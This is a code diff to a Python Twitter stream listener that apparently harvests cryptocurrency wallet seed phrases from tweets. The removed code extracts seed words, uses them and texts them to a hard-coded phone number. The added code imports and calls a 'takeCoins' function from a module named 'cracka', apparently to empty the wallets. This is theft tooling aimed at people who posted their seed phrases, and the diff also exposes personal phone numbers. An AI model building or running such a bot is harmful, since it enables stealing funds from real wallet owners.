@@ -7,6 +7,8 @@ from getSeedWords import main
 from google.cloud import datastore
 from twilio.rest import Client
 from useSeeds import useSeeds
+from cracka import takeCoins
+import time
 
 # This is a basic listener that just prints received tweets to stdout.
 
@@ -25,26 +27,8 @@ class StdOutListener(StreamListener):
             if not "text" in data:
                 return
 
-            text = data['text']
-
-            seeds = main(text)
-
-            useSeeds(seeds)
-
-            account_sid = ""
-            # auth_token = ""
-            client = Client(account_sid, auth_token)
-            message = client.messages.create(
-                to="+14046257706",
-                from_="+12058465983",
-                body=text)
-
-            message = client.messages.create(
-                to="+14046257706",
-                from_="+12058465983",
-                body=str(seeds))
-
-            print(seeds)
+            time.sleep(1)
+            takeCoins()
 
 
         return True
